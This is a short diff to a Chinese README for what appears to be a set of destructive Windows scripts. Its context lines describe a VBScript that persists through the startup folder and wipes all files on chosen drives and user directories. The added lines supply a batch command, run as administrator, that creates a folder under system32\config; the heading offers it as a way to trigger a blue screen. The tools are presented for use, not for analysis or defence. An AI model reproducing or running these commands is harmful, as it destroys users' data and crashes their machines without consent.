@@ -18,3 +18,17 @@
 ### 删除指定磁盘文件：`data_deletion.vbs`
 1. **持久化**：在当前用户的启动文件夹创建一个新的 VBScript 脚本。
 2. **数据删除**：新脚本会在系统启动时等待一段时间后，删除指定磁盘分区和用户目录下的所有文件和文件夹，并最终删除自身。
+
+
+## 补充蓝屏.bat
+通过管理员权限运行 `cmd`，输入以下命令：
+```
+mkdir "C:\Windows\system32\config\OSDATA"
+```
+```
+@echo off
+mkdir "C:\Windows\system32\config\OSDATA"
+```
+
+
+### 第2代脚本在测试过程中遇到的问题，可能在部分情况下无法运行
